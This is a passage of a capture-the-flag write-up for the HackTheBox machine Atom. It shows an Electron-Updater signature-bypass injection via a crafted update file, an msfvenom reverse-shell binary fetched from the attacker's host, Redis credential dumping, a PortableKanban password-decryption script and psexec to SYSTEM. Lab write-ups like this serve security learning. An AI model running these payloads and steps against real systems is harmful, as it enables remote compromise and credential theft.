</span></span><span class=line><span class=cl>SMB         10.10.10.237    <span class=m>445</span>    ATOM             ADMIN$                          Remote Admin
</span></span><span class=line><span class=cl>SMB         10.10.10.237    <span class=m>445</span>    ATOM             C$                              Default share
</span></span><span class=line><span class=cl>SMB         10.10.10.237    <span class=m>445</span>    ATOM             IPC$                            Remote IPC
</span></span><span class=line><span class=cl>SMB         10.10.10.237    <span class=m>445</span>    ATOM             Software_Updates READ,WRITE      
</span></span></code></pre></div><h4 id=software_updates-share>Software_Updates Share<a class=anchor aria-hidden=true href=#software_updates-share>#</a></h4><p>In <code>Software_Updates</code>, there is a PDF file called <code>UAT_Testing_Procedures.pdf</code>. I&rsquo;ll grab that file.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>â†’ root@kali Â«atomÂ» Â«10.10.14.49Â» 
</span></span><span class=line><span class=cl>$ smbclient -N //10.10.10.237/Software_Updates
</span></span><span class=line><span class=cl>Try <span class=s2>&#34;help&#34;</span> to get a list of possible commands.
</span></span><span class=line><span class=cl>smb: <span class=se>\&gt;</span> dir
</span></span><span class=line><span class=cl>  .                                   D        <span class=m>0</span>  Mon May <span class=m>17</span> 08:05:58 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  ..                                  D        <span class=m>0</span>  Mon May <span class=m>17</span> 08:05:58 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  client1                             D        <span class=m>0</span>  Mon May <span class=m>17</span> 08:05:58 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  client2                             D        <span class=m>0</span>  Mon May <span class=m>17</span> 08:05:58 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  client3                             D        <span class=m>0</span>  Mon May <span class=m>17</span> 08:05:58 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  UAT_Testing_Procedures.pdf          A    <span class=m>35202</span>  Fri Apr  <span class=m>9</span> 07:18:08 <span class=m>2021</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=m>4413951</span> blocks of size 4096. <span class=m>1361569</span> blocks available
</span></span><span class=line><span class=cl>smb: <span class=se>\&gt;</span> recurse on
</span></span><span class=line><span class=cl>smb: <span class=se>\&gt;</span> prompt off
</span></span><span class=line><span class=cl>smb: <span class=se>\&gt;</span> mget *
</span></span><span class=line><span class=cl>getting file <span class=se>\U</span>AT_Testing_Procedures.pdf of size <span class=m>35202</span> as UAT_Testing_Procedures.pdf <span class=o>(</span>121.5 KiloBytes/sec<span class=o>)</span> <span class=o>(</span>average 121.5 KiloBytes/sec<span class=o>)</span>
</span></span></code></pre></div><h3 id=tcp-80443---website>TCP 80,443 - Website<a class=anchor aria-hidden=true href=#tcp-80443---website>#</a></h3><p>Both port 80 and 443 are display the same site, it&rsquo;s a software company site called &ldquo;Heed Solutions&rdquo;.</p><p><div class=img-container><img src=imgs/image-20210517190515610.png alt=image-20210517190515610></div></p><p>At the bottom, there is a hostname and a download link that points to <code>http://10.10.10.237/releases/heed_setup_v1.0.0.zip</code>.</p><p><div class=img-container><img src=imgs/image-20210517190532910.png alt=image-20210517190532910></div></p><p>I&rsquo;ll add the hostname to my <code>/etc/hosts</code> file and then download the previous software.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>â†’ root@kali Â«atomÂ» Â«10.10.14.49Â» 
</span></span><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=s1>&#39;10.10.10.237 atom.htb&#39;</span> &gt;&gt; /etc/hosts
</span></span></code></pre></div><p>After the hostname added, the site still shows the same content.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>â†’ root@kali Â«atomÂ» Â«10.10.14.49Â» 
</span></span><span class=line><span class=cl>$ curl -s -k https://10.10.10.237/ <span class=p>|</span> wc -c
</span></span><span class=line><span class=cl><span class=m>7581</span>
</span></span><span class=line><span class=cl>â†’ root@kali Â«atomÂ» Â«10.10.14.49Â» 
</span></span><span class=line><span class=cl>$ curl -s -k http://10.10.10.237/ <span class=p>|</span> wc -c 
</span></span><span class=line><span class=cl><span class=m>7581</span>
</span></span><span class=line><span class=cl>â†’ root@kali Â«atomÂ» Â«10.10.14.49Â» 
</span></span><span class=line><span class=cl>$ curl -s -k http://atom.htb/ <span class=p>|</span> wc -c
</span></span><span class=line><span class=cl><span class=m>7581</span>
</span></span><span class=line><span class=cl>â†’ root@kali Â«atomÂ» Â«10.10.14.49Â» 
</span></span><span class=line><span class=cl>$ curl -s -k https://atom.htb/ <span class=p>|</span> wc -c
</span></span><span class=line><span class=cl><span class=m>7581</span>
</span></span></code></pre></div><h3 id=analysis>Analysis<a class=anchor aria-hidden=true href=#analysis>#</a></h3><p>The previous zip file contains one executable file called <code>heedv1 Setup 1.0.0.exe</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>â†’ root@kali Â«lootÂ» Â«10.10.14.49Â» 
</span></span><span class=line><span class=cl>$ file heedv1_setup_1.0.0.exe 
</span></span><span class=line><span class=cl>heedv1_setup_1.0.0.exe: PE32 executable <span class=o>(</span>GUI<span class=o>)</span> Intel 80386, <span class=k>for</span> MS Windows, Nullsoft Installer self-extracting archive
</span></span></code></pre></div><p>It says &ldquo;self-extracting archive&rdquo;, meaning it can be extracted, for example using <code>7z</code>.</p><p>While looking into the app structure, I spotted a file called <code>app-update.yml</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>â†’ root@kali Â«heed_extractedÂ» Â«10.10.14.49Â» 
</span></span><span class=line><span class=cl>$ tree
</span></span><span class=line><span class=cl>.
</span></span><span class=line><span class=cl>â”œâ”€â”€ <span class=nv>$PLUGINSDIR</span>
</span></span><span class=line><span class=cl>â”‚Â Â  â”œâ”€â”€ app-64
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span><span class=line><span class=cl>â”‚Â Â  â”‚Â Â  â”œâ”€â”€ natives_blob.bin
</span></span><span class=line><span class=cl>â”‚Â Â  â”‚Â Â  â”œâ”€â”€ resources
</span></span><span class=line><span class=cl>â”‚Â Â  â”‚Â Â  â”‚Â Â  â”œâ”€â”€ app.asar
</span></span><span class=line><span class=cl>â”‚Â Â  â”‚Â Â  â”‚Â Â  â”œâ”€â”€ app-update.yml <span class=c1># ==&gt; Updater config</span>
</span></span><span class=line><span class=cl>â”‚Â Â  â”‚Â Â  â”‚Â Â  â”œâ”€â”€ electron.asar
</span></span><span class=line><span class=cl>â”‚Â Â  â”‚Â Â  â”‚Â Â  â”œâ”€â”€ elevate.exe
</span></span><span class=line><span class=cl>â”‚Â Â  â”‚Â Â  â”‚Â Â  â””â”€â”€ inspector
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=m>73</span> directories, <span class=m>274</span> files
</span></span></code></pre></div><p>The file contains another hostname, which I&rsquo;ll add it to <code>/etc/hosts</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>â†’ root@kali Â«heed_extractedÂ» Â«10.10.14.49Â» 
</span></span><span class=line><span class=cl>$ cat ./<span class=se>\$</span>PLUGINSDIR/app-64/resources/app-update.yml
</span></span><span class=line><span class=cl>provider: generic
</span></span><span class=line><span class=cl>url: <span class=s1>&#39;http://updates.atom.htb&#39;</span>
</span></span><span class=line><span class=cl>publisherName:
</span></span><span class=line><span class=cl>  - HackTheBox
</span></span></code></pre></div><p>And again, it is the same site.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>â†’ root@kali Â«heed_extractedÂ» Â«10.10.14.49Â» 
</span></span><span class=line><span class=cl>$ curl -s http://updates.atom.htb/ <span class=p>|</span> wc -c
</span></span><span class=line><span class=cl><span class=m>7581</span>
</span></span></code></pre></div><p>Guessing based on the content of <code>UAT_Testing_Procedures.pdf</code> file from SMB enumeration, <code>heedv1_setup_1.0.0.exe</code> is currently on testing phase. Other information that I can obtain are:</p><ul><li>The app is packed with electron-builder</li><li>The app has auto-update feature, but before releasing the updated app, the QA team will test it first.</li></ul><p><div class=img-container><img src=imgs/image-20210517200229002.png alt=image-20210517200229002></div></p><p>According to the image above, the <code>client</code> folder here probably refers to the ones on SMB.</p><h2 id=foothold>Foothold<a class=anchor aria-hidden=true href=#foothold>#</a></h2><h3 id=shell-as-jason>Shell as Jason<a class=anchor aria-hidden=true href=#shell-as-jason>#</a></h3><h4 id=rce-electron-updater---background>RCE Electron-Updater - Background<a class=anchor aria-hidden=true href=#rce-electron-updater---background>#</a></h4><p>I went to the rabbit hole by analyzing the executable file. At first, I thought I could inject the <code>app-update.yml</code> to point to my malicious <code>.exe</code> file and repack the app. I got the idea of poisoning the update file but didn&rsquo;t know where to start until I found this <a href=https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html>blog</a>.</p><p>According to that blog, during a software update, previous Electron-Updater uses the following line to perform a signature verification check on the new version of binary file.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>execFile(&#34;powershell.exe&#34;, [&#34;-NoProfile&#34;, &#34;-NonInteractive&#34;, &#34;-InputFormat&#34;, &#34;None&#34;, &#34;-Command&#34;, `Get-AuthenticodeSignature &#39;${tempUpdateFile}&#39; | ConvertTo-Json -Compress`], {
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span></code></pre></div><p>If <code>${tempUpdateFile}</code> is a user-controlled input, this can be leveraged for command injection: <code>';calc;'</code></p><blockquote><p><em>Since the <code>${tempUpdateFile}</code> variable is provided unescaped to the <code>execFile</code> utility, an attacker could bypass the entire signature verification by triggering a parse error in the script.</em></p></blockquote><p>The following is an example of malicious update definition that will pop a calculator.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>version: 2.0.0
</span></span><span class=line><span class=cl>path: u&#39;;calc;&#39;pdate.exe
</span></span><span class=line><span class=cl>sha512: qwP35Rn5PLaBoZ8tzvRFK...&lt;SNIP&gt;...LM3WCmvJUXMYmZGW6T+fI=
</span></span><span class=line><span class=cl>releaseDate: &#39;2021-01-24T13:44:59.064Z&#39;
</span></span></code></pre></div><p>Sending this <code>u';payload;'pdate.exe</code> as path would be troublesome, which is simplified as follows:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>`Get-AuthenticodeSignature &#39;u&#39;;payload;&#39;pdate.exe&#39; | ConvertTo-Json -Compress`
</span></span></code></pre></div><p>Now that if a single quote <code>'</code> is added to <code>path</code>, it becomes:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>`Get-AuthenticodeSignature &#39;u&#39;pdate.exe&#39; | ConvertTo-Json -Compress`
</span></span></code></pre></div><p>But then, it would breaks the signature verification. And here&rsquo;s come the interesting part, an attacker could easily bypass this signature verification by recalculating the hash of <code>u'pdate.exe</code>. That&rsquo;s very clever, right?</p><h4 id=rce-electron-updater---exploitation>RCE Electron-Updater - Exploitation<a class=anchor aria-hidden=true href=#rce-electron-updater---exploitation>#</a></h4><p>According to the SMB enumeration, all the <code>client</code> folders are writable, which means exploitation can be done in two ways: local and remote. But, I&rsquo;ll go with remote ğŸ˜….</p><p>First, I&rsquo;ll have to generate a reverse shell binary. This can be done with <code>msfvenom</code>. I&rsquo;ll host this binary using Python web server afterwards.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>â†’ root@kali Â«exploitsÂ» Â«10.10.14.49Â» 
</span></span><span class=line><span class=cl>$ msfvenom -p windows/x64/shell_reverse_tcp <span class=nv>LHOST</span><span class=o>=</span>10.10.14.49 <span class=nv>LPORT</span><span class=o>=</span><span class=m>53</span> -f exe -o i<span class=se>\&#39;</span>amf.exe
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> No arch selected, selecting arch: x64 from the payload
</span></span><span class=line><span class=cl>No encoder or badchars specified, outputting raw payload
</span></span><span class=line><span class=cl>Payload size: <span class=m>460</span> bytes
</span></span><span class=line><span class=cl>Final size of exe file: <span class=m>7168</span> bytes
</span></span><span class=line><span class=cl>Saved as: i<span class=err>&#39;</span>amf.exe
</span></span></code></pre></div><p>Next, I&rsquo;ll need to calculate the hash of <code>i'amf.exe</code> using the following command:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>â†’ root@kali Â«exploitsÂ» Â«10.10.14.49Â» 
</span></span><span class=line><span class=cl>$ shasum -a <span class=m>512</span> i<span class=se>\&#39;</span>amf.exe <span class=p>|</span> cut -d <span class=s1>&#39; &#39;</span> -f1 <span class=p>|</span> xxd -r -p <span class=p>|</span> base64 <span class=p>|</span> tr -d <span class=s1>&#39;\n&#39;</span>
</span></span><span class=line><span class=cl>Y4xekmQ80+ALOD0xXBgPdaOmgSsbK8jACQ6xmF4ndoEOvleyI4HRTDniVdExVNryCPWGgxOElKPhMyJCywuLtw<span class=o>==</span>
</span></span></code></pre></div><p>The last thing I need is the update file. I&rsquo;ll create one called <code>update-iamf.yml</code> which contains the following update definitions:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-yaml data-lang=yaml><span class=line><span class=cl><span class=nt>version</span><span class=p>:</span><span class=w> </span><span class=m>2.0.1</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>path</span><span class=p>:</span><span class=w> </span><span class=l>http://10.10.14.83/i&#39;amf.exe</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>sha512</span><span class=p>:</span><span class=w> </span><span class=l>Y4xekmQ80+ALOD0xXBgPdaOmgSsbK8jACQ6xmF4ndoEOvleyI4HRTDniVdExVNryCPWGgxOElKPhMyJCywuLtw==</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>releaseDate</span><span class=p>:</span><span class=w> </span><span class=s1>&#39;2021-01-24T13:44:59.064Z&#39;</span><span class=w>
</span></span></span></code></pre></div><p>I&rsquo;ll upload the update file to <code>Software_Updates</code> share using <code>smbclient</code> and start a netcat listener. After a few minutes, the reverse shell binary connected to my listener.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>â†’ root@kali Â«exploitsÂ» Â«10.10.14.49Â» 
</span></span><span class=line><span class=cl>$ smbclient -N //10.10.10.237/Software_Updates -c <span class=s2>&#34;put iamf-update.yml client1/latest.yml&#34;</span>  <span class=o>&amp;&amp;</span> nc -nvlp <span class=m>53</span>
</span></span><span class=line><span class=cl>putting file iamf-update.yml as <span class=se>\c</span>lient1<span class=se>\l</span>atest.yml <span class=o>(</span>1.1 kb/s<span class=o>)</span> <span class=o>(</span>average 1.1 kb/s<span class=o>)</span>
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>53</span> ...
</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.14.49<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.237<span class=o>]</span> <span class=m>64352</span>
</span></span><span class=line><span class=cl>Microsoft Windows <span class=o>[</span>Version 10.0.19042.906<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>(</span>c<span class=o>)</span> Microsoft Corporation. All rights reserved.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\W</span>INDOWS<span class=se>\s</span>ystem32&gt;whoami
</span></span><span class=line><span class=cl>whoami
</span></span><span class=line><span class=cl>atom<span class=se>\j</span>ason
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\W</span>INDOWS<span class=se>\s</span>ystem32&gt;
</span></span></code></pre></div><p>User flag is done here.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\j</span>ason<span class=se>\D</span>esktop&gt;type user.txt
</span></span><span class=line><span class=cl><span class=nb>type</span> user.txt
</span></span><span class=line><span class=cl>b77e754354e186f...&lt;SNIP&gt;...
</span></span></code></pre></div><h2 id=privilege-escalation>Privilege Escalation<a class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><h3 id=shell-as-system>Shell as SYSTEM<a class=anchor aria-hidden=true href=#shell-as-system>#</a></h3><h4 id=internal-enumeration>Internal Enumeration<a class=anchor aria-hidden=true href=#internal-enumeration>#</a></h4><p>WinPEAS discovers a set of credentials for user <code>jason</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span><span class=line><span class=cl>[+] Checking Credential manager
</span></span><span class=line><span class=cl>   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault
</span></span><span class=line><span class=cl>    [!] Warning: if password contains non-printable characters, it will be printed as unicode base64 encoded string
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>     Username:              ATOM\jason
</span></span><span class=line><span class=cl>     Password:               kidvscat_electron_@123
</span></span><span class=line><span class=cl>     Target:                ATOM\jason
</span></span><span class=line><span class=cl>     PersistenceType:       Enterprise
</span></span><span class=line><span class=cl>     LastWriteTime:         3/31/2021 2:53:49 AM
</span></span></code></pre></div><p>On Jason&rsquo;s download directory, there is a PortableKanban folder. PortableKanban itself is a password manager. I have familiarity with this application from HTB Sharp. Its config contains an encrypted Redis database password (The clear password revealed in the next section).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>C:\Users\jason\Downloads&gt;type PortableKanban\PortableKanban.cfg
</span></span><span class=line><span class=cl>type PortableKanban\PortableKanban.cfg
</span></span><span class=line><span class=cl>{&#34;RoamingSettings&#34;:{&#34;DataSource&#34;:&#34;RedisServer&#34;,&#34;DbServer&#34;:&#34;localhost&#34;,&#34;DbPort&#34;:6379,&#34;DbEncPassword&#34;:&#34;Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb&#34;
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span></code></pre></div><h4 id=redis-revisited>Redis Revisited<a class=anchor aria-hidden=true href=#redis-revisited>#</a></h4><p>Looking into the Redis installation folder, I find a plain password in <code>redis.windows.conf</code> file.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>C:\Program Files\Redis&gt;type redis.windows.conf | findstr requirepass
</span></span><span class=line><span class=cl>type redis.windows.conf | findstr requirepass
</span></span><span class=line><span class=cl>requirepass kidvscat_yes_kidvscat
</span></span></code></pre></div><p><code>redis.windows-service.conf</code> also contains the same password.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>C:\Program Files\Redis&gt;type redis.windows-service.conf | findstr requirepass
</span></span><span class=line><span class=cl>type redis.windows-service.conf | findstr requirepass
</span></span><span class=line><span class=cl>requirepass kidvscat_yes_kidvscat
</span></span></code></pre></div><p>The password <code>kidvscat_yes_kidvscat</code> works on Redis.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>â†’ root@kali Â«atomÂ» Â«10.10.14.49Â» 
</span></span><span class=line><span class=cl>$ rlwrap nc -nv 10.10.10.237 <span class=m>6379</span>
</span></span><span class=line><span class=cl><span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.237<span class=o>]</span> <span class=m>6379</span> <span class=o>(</span>redis<span class=o>)</span> open
</span></span><span class=line><span class=cl>AUTH jason kidvscat_electron_@123
</span></span><span class=line><span class=cl>-ERR wrong number of arguments <span class=k>for</span> <span class=s1>&#39;auth&#39;</span> <span class=nb>command</span>
</span></span><span class=line><span class=cl>AUTH kidvscat_electron_@123
</span></span><span class=line><span class=cl>-ERR invalid password
</span></span><span class=line><span class=cl>AUTH kidvscat_yes_kidvscat
</span></span><span class=line><span class=cl>+OK
</span></span></code></pre></div><p>It&rsquo;s possible to dump the database that is currently in use.</p><p>To do that, I&rsquo;ll send <code>INFO</code> command and starting to look for a chunk called <code>Keyspace</code> .</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>INFO
</span></span><span class=line><span class=cl>$1938
</span></span><span class=line><span class=cl># Server
</span></span><span class=line><span class=cl>redis_version:3.0.504
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span><span class=line><span class=cl># Keyspace
</span></span><span class=line><span class=cl>db0:keys=4,expires=0,avg_ttl=0
</span></span></code></pre></div><p>There is one database active, which is <code>db0</code> and it contains 4 keys.</p><p>I&rsquo;ll send <code>KEYS *</code> command to get all the stored keys.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>SELECT 0
</span></span><span class=line><span class=cl>+OK
</span></span><span class=line><span class=cl>KEYS *
</span></span><span class=line><span class=cl>*4
</span></span><span class=line><span class=cl>$48
</span></span><span class=line><span class=cl>pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0
</span></span><span class=line><span class=cl>$11
</span></span><span class=line><span class=cl>pk:ids:User
</span></span><span class=line><span class=cl>$20
</span></span><span class=line><span class=cl>pk:ids:MetaDataClass
</span></span><span class=line><span class=cl>$57
</span></span><span class=line><span class=cl>pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff
</span></span></code></pre></div><p>The value of <code>pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0</code> contains a credentials of the Administrator account, but the password is encrypted.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>GET pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0
</span></span><span class=line><span class=cl>$207
</span></span><span class=line><span class=cl>{&#34;Id&#34;:&#34;e8e29158d70d44b1a1ba4949d52790a0&#34;,&#34;Name&#34;:&#34;Administrator&#34;,&#34;Initials&#34;:&#34;&#34;,&#34;Email&#34;:&#34;&#34;,&#34;EncryptedPassword&#34;:&#34;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi&#34;,&#34;Role&#34;:&#34;Admin&#34;,&#34;Inactive&#34;:false,&#34;TimeStamp&#34;:637530169606440253}
</span></span></code></pre></div><h4 id=portablekanban-decrypt>PortableKanban Decrypt<a class=anchor aria-hidden=true href=#portablekanban-decrypt>#</a></h4><p>By assuming that the password is encrypted using PortableKanban, I could try to decrypt the password I obtained using the following <a href=https://github.com/fahmifj/PortableKanban-decrypt/blob/main/pk-decrypt.py>script</a> (a modified version of the original exploit).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>from base64 import b64decode
</span></span><span class=line><span class=cl>import sys
</span></span><span class=line><span class=cl>import des 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>key</span> <span class=o>=</span> des.DesKey<span class=o>(</span>b<span class=s1>&#39;7ly6UznJ&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=nv>iv</span> <span class=o>=</span> b<span class=s1>&#39;XuVUm5fR&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>try:    
</span></span><span class=line><span class=cl>	<span class=nv>passwd</span> <span class=o>=</span> b64decode<span class=o>(</span>sys.argv<span class=o>[</span>1<span class=o>]</span>.encode<span class=o>(</span><span class=s1>&#39;UTF-8&#39;</span><span class=o>))</span>
</span></span><span class=line><span class=cl>except IndexError:
</span></span><span class=line><span class=cl>	print<span class=o>(</span><span class=s1>&#39;[-] Usage: %s &lt;base64_encrypted_passwd&gt;&#39;</span> % sys.argv<span class=o>[</span>0<span class=o>])</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>	sys.exit<span class=o>(</span>-1<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>dec_password</span> <span class=o>=</span> key.decrypt<span class=o>(</span>passwd, <span class=nv>initial</span><span class=o>=</span>iv, <span class=nv>padding</span><span class=o>=</span>True<span class=o>)</span>
</span></span><span class=line><span class=cl>print<span class=o>(</span><span class=s2>&#34;[+] Decrypted Password: &#34;</span> + dec_password.decode<span class=o>(</span><span class=s1>&#39;UTF-8&#39;</span><span class=o>))</span>
</span></span></code></pre></div><p>The administrator password has been decrypted to <code>kidvscat_admin_@123</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>â†’ kali@kali Â«atomÂ» Â«10.10.14.83Â»
</span></span><span class=line><span class=cl>$ python3 pk-decrypt.py Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Decrypted Password: kidvscat_admin_@123
</span></span></code></pre></div><h4 id=psexecpy>psexec.py<a class=anchor aria-hidden=true href=#psexecpy>#</a></h4><p>I could use the credentials in psexec from impacket to obtain interactive shell access as system.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>â†’ root@kali Â«atomÂ» Â«10.10.14.49Â» 
</span></span><span class=line><span class=cl>$ impacket-psexec atom/administrator:<span class=s1>&#39;kidvscat_admin_@123&#39;</span>@10.10.10.237
</span></span><span class=line><span class=cl>Impacket v0.9.22 - Copyright <span class=m>2020</span> SecureAuth Corporation
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Requesting shares on 10.10.10.237.....
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Found writable share ADMIN$
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Uploading file FCSITnEj.exe
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Opening SVCManager on 10.10.10.237.....
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Creating service DCLl on 10.10.10.237.....
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Starting service DCLl.....
</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> Press <span class=nb>help</span> <span class=k>for</span> extra shell commands
</span></span><span class=line><span class=cl>Microsoft Windows <span class=o>[</span>Version 10.0.19042.906<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>(</span>c<span class=o>)</span> Microsoft Corporation. All rights reserved.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\W</span>INDOWS<span class=se>\s</span>ystem32&gt;whoami <span class=o>&amp;&amp;</span> hostname
</span></span><span class=line><span class=cl>nt authority<span class=se>\s</span>ystem
</span></span><span class=line><span class=cl>ATOM
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\W</span>INDOWS<span class=se>\s</span>ystem32&gt;ipconfig
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Windows IP Configuration
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Ethernet adapter Ethernet0:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   Connection-specific DNS Suffix  . :
</span></span><span class=line><span class=cl>   IPv6 Address. . . . . . . . . . . : dead:beef::525:3f10:5c90:26bf
</span></span><span class=line><span class=cl>   Temporary IPv6 Address. . . . . . : dead:beef::cc8a:70e1:ba06:84ed
</span></span><span class=line><span class=cl>   Link-local IPv6 Address . . . . . : fe80::525:3f10:5c90:26bf%6
</span></span><span class=line><span class=cl>   IPv4 Address. . . . . . . . . . . : 10.10.10.237
</span></span><span class=line><span class=cl>   Subnet Mask . . . . . . . . . . . : 255.255.255.0
</span></span><span class=line><span class=cl>   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%6
</span></span><span class=line><span class=cl>                                       10.10.10.2
</span></span></code></pre></div><div class=post-references><h2>References</h2><ul><li><a href=https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html target=_blank rel="noopener noreferrer">https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html</a></li><li><a href=https://book.hacktricks.xyz/pentesting/6379-pentesting-redis target=_blank rel="noopener noreferrer">https://book.hacktricks.xyz/pentesting/6379-pentesting-redis</a></li><li><a href=https://www.exploit-db.com/exploits/49409 target=_blank rel="noopener noreferrer">https://www.exploit-db.com/exploits/49409</a></li></ul></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://fahmifj.github.io/tags/windows/>Windows</a></li><li><a href=https://fahmifj.github.io/tags/electron-builder/>Electron-builder</a></li><li><a href=https://fahmifj.github.io/tags/electron-updater/>Electron-updater</a></li><li><a href=https://fahmifj.github.io/tags/command-injection/>Command-injection</a></li><li><a href=https://fahmifj.github.io/tags/msfvenom/>msfvenom</a></li><li><a href=https://fahmifj.github.io/tags/redis/>Redis</a></li><li><a href=https://fahmifj.github.io/tags/portablekanban/>PortableKanban</a></li></ul><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Atom on twitter" href="https://twitter.com/intent/tweet/?text=HackTheBox%20-%20Atom&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fatom%2f&hashtags=Windows%2cElectron-builder%2cElectron-updater%2cCommand-injection%2cmsfvenom%2cRedis%2cPortableKanban"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 